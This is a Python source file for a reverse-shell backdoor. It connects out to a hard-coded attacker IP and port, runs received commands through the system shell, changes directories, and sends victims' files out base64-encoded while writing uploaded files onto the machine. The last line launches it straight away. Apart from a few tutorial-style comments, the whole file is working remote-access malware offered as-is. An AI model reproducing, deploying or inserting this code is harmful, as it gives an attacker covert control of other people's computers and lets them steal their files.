import subprocess,json,os,base64,socket

class Backdoor: 
    def __init__(self, ip, port):                                               #IP of the attacker machine that we want to connect to
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     #Initializing socket. See socket module documentation for more info. For now, this line can be seen as a standard for initializing sockets.
        self.connection.connect((ip, port))
        self.send_results()

    def execute_system_command(self, command):
        command = ' '.join(map(str, command))
        try:
            result = subprocess.check_output(command, shell=True)
        except Exception:
            return "Error, Try Again. "
        return result

    def change_working_directory(self, path):
        try:
            
            if(len(path)>1):
                path_string = ' '.join(map(str,path))
            else:
                path_string = ''.join(map(str,path))
            os.chdir(path_string)

        except Exception:
            return "Not Found. Try again. "
        return f"Changing directory to: {path_string}"

    def read_file(self,path):

        try:
            if(len(path)>1):
                path_string = ' '.join(map(str,path))
            else:
                path_string = ''.join(map(str,path))
            with open(path_string, "rb") as file:
                return base64.b64encode(file.read())                #This will encode any unreadable character to base64 so that we can read any file. (instead of utf-8 encoding)
        except Exception:
            return "Puna Prayaas Garnuhola"
        

    def write_file(self, path, content):
        if(len(path)>1):
            path_string = ' '.join(map(str,path))
        else:
            path_string = ''.join(map(str,path))
        if 'Puna Prayaas' in content: 
            return 'Puna Prayaas Garnuhola'
        else:
            with open(path, 'wb') as file:
                # content = content.encode('iso-8859-1')
                file.write(base64.b64decode(content))
            return '[+] Upload Successful'       

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(102400).decode('utf-8')
                return json.loads(json_data)
            except Exception:
                continue

    def send_results(self):
        while True:
            recieved_data = self.recieve()
            if(recieved_data[0].lower() == "exit"):
                self.connection.close()
                exit()
            
            elif recieved_data[0].lower() == "cd" and len(recieved_data) >1:
                command_result = self.change_working_directory(recieved_data[1:])
            
            elif recieved_data[0].lower() == "download":
                command_result = self.read_file(recieved_data[1:])
            
            elif recieved_data[0].lower() == "upload":
                # path_string = "".join(map(str,recieved_data[1]))                           #Converting the list into a string of file's name. 
                command_result = self.write_file(recieved_data[1], recieved_data[2])
            
            else:
                command_result = self.execute_system_command(recieved_data)                 #The execute_system_command method still works, because subprocess.check_output can also take a list as arguments. 
            if(type(command_result) is bytes):
                self.send(command_result.decode('iso-8859-1'))
            else:
                self.send(command_result)


backdoor = Backdoor("192.168.1.186", 8080)